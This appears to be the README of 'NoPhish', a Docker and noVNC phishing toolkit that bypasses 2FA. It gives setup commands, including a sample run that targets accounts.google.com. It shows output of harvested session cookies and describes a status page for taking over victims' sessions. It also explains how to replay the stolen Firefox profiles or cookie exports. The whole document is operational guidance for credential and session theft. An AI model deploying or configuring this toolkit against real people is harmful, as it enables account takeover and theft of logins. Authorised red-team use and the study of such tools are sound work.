# NoPhish
 
Another phishing toolkit which provides an docker and noVNC based infrastructure. The whole setup is based on the initial article of [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/) and [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html).

A detailed description of the setup can be found here - [Another phishing tool](https://powerseb.github.io/posts/Another-phishing-tool/)

## Installation

Install the required python modules:

```console
pip install lz4
```

Install the setup (which will create the required docker images):

```console
setup.sh install
```

## Execution

The setup offers the following parameters:

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set

```

A basic run looks like the following:

```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```

During the run the following overview provides a status per URL how many cookies or session informations have been gathered.

```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/c18d058717000d3012ac5f492c11 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/b083a984e423ef0215a541337692 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/0b61f4b831dfe15b811c6b880351 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/28e09fec384967e8c4c05b80e1eb :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```

Please note that the tool will export all cookies / session information even when it is not related to a successfull login.

Further you can also directly interact with the tool on the status page - `http(s)://%DOMAIN%:65534/status.php`. There you have the possability to disconnect the user and directly take over the session. 

## Using profile export
If you are using the complete FireFox profile export, you can just call firefox with -profile like that:

On Windows:
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

On Linux:
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

Everything is getting restored, including the latest site.

Please note by default you need to extract the zip archive or set the parameter `-z` to `false`. If the export format `-e simple` is chosen two json files will be generated which can be used with Cookiebro which is available for [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) and [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn).


## CleanUp

During a run the script can be terminated with `ctrl` + `c` - all running docker container will then be deleted. To fully remove the setup run `setup.sh cleanup`.
